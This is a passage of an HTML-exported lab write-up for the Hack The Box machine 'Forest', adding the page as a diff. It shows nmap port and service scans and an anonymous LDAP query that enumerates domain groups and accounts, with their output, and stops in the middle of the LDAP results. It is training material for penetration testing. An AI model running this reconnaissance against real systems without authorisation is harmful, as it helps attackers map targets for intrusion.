@@ -1,0 +1,1711 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Forest - 10.10.10.161</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="191d1b9f-8847-807a-b1e6-d9f55a142446" class="page sans"><header><h1 class="page-title">Forest - 10.10.10.161</h1><p class="page-description"></p></header><div class="page-body"><h1 id="191d1b9f-8847-8148-a4fb-ebea1923e46f" class="">Information Gathering &amp; Enumeration</h1><p id="191d1b9f-8847-819b-a621-f96205368154" class="">
+</p><h2 id="191d1b9f-8847-81fe-9d57-e2707cf0a362" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="191d1b9f-8847-817a-9812-cd0c1eefa06f" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ sudo nmap -sS --min-rate=5000 -p- -T5 -n 10.10.10.161
+[sudo] password for drroot: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:34 -05
+Nmap scan report for 10.10.10.161
+Host is up (0.12s latency).
+Not shown: 65512 closed tcp ports (reset)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49706/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="191d1b9f-8847-8110-b092-edb36f89af06" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ nmap -sVC -T5 -n 10.10.10.161 -p53,88,135,139,389,445,464,593,636,3268,3269,9389
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:45 -05
+Nmap scan report for 10.10.10.161
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-09 00:52:53Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+9389/tcp open  mc-nmf       .NET Message Framing
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m48s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2025-02-08T16:53:05-08:00
+| smb2-time: 
+|   date: 2025-02-09T00:53:03
+|_  start_date: 2025-02-09T00:39:15
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.91 seconds
+                                                                 
+</code></pre><h2 id="191d1b9f-8847-81f3-98dc-d5077b4ceb18" class="">LDAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="191d1b9f-8847-8162-b243-f7b2634b9433" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ ldapsearch -x -H ldap://10.10.10.161 -b &quot;CN=users,dc=htb,dc=local&quot; | grep -iE &quot;name|userPrincipalName|pwd&quot; 
+distinguishedName: CN=Users,DC=htb,DC=local
+name: Users
+distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,
+name: Allowed RODC Password Replication Group
+sAMAccountName: Allowed RODC Password Replication Group
+distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,D
+name: Denied RODC Password Replication Group
+sAMAccountName: Denied RODC Password Replication Group
+distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,
+name: Enterprise Read-only Domain Controllers
+sAMAccountName: Enterprise Read-only Domain Controllers
+distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
+name: Cloneable Domain Controllers
+sAMAccountName: Cloneable Domain Controllers
+distinguishedName: CN=Protected Users,CN=Users,DC=htb,DC=local
+name: Protected Users
+sAMAccountName: Protected Users
+distinguishedName: CN=Key Admins,CN=Users,DC=htb,DC=local
+name: Key Admins
+sAMAccountName: Key Admins
+distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
+name: Enterprise Key Admins
+sAMAccountName: Enterprise Key Admins
+distinguishedName: CN=DnsAdmins,CN=Users,DC=htb,DC=local
+name: DnsAdmins
+sAMAccountName: DnsAdmins
+distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
+name: DnsUpdateProxy
+sAMAccountName: DnsUpdateProxy
+distinguishedName: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=lo
+name: Exchange Online-ApplicationAccount
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: $331000-VK4ADACQNUCA
+userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
+distinguishedName: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=U
+displayName: Microsoft Exchange Approval Assistant
+name: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_2c8eef0a09b545acb
+userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:6739242777682513052927323243292203259333256
+msExchUMDtmfMap: firstNameLastName:6739242777682513052927323243292203259333256
+mailNickname: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
+distinguishedName: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=U
+displayName: Microsoft Exchange
+name: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_ca8c2ed5bdab4dc9b
+userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:7978366245269225582359731422983373537413292
+msExchUMDtmfMap: firstNameLastName:7978366245269225582359731422983373537413292
+mailNickname: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
+distinguishedName: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=U
+displayName: Microsoft Exchange
+name: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_75a538d3025e4db9a
+userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:6739243472683793032122989234034267836229382
+msExchUMDtmfMap: firstNameLastName:6739243472683793032122989234034267836229382
+mailNickname: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
+distinguishedName: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334B
+displayName: Discovery Search Mailbox
+name: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_681f53d4942840e18
+userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:6739243472683796245269391922054626415380237
+msExchUMDtmfMap: firstNameLastName:6739243472683796245269391922054626415380237
+mailNickname: DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
+distinguishedName: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,
+displayName: Microsoft Exchange Migration
+name: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_1b41c9286325456bb
+userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:64472846683337716201143349621222623229136
+msExchUMDtmfMap: firstNameLastName:64472846683337716201143349621222623229136
+mailNickname: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
+distinguishedName: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=U
+displayName: Microsoft Exchange Federation Mailbox
+name: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_9b69f1b9d2cc45549
+userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:3333728333624542134382817941489323002953213
+msExchUMDtmfMap: firstNameLastName:3333728333624542134382817941489323002953213
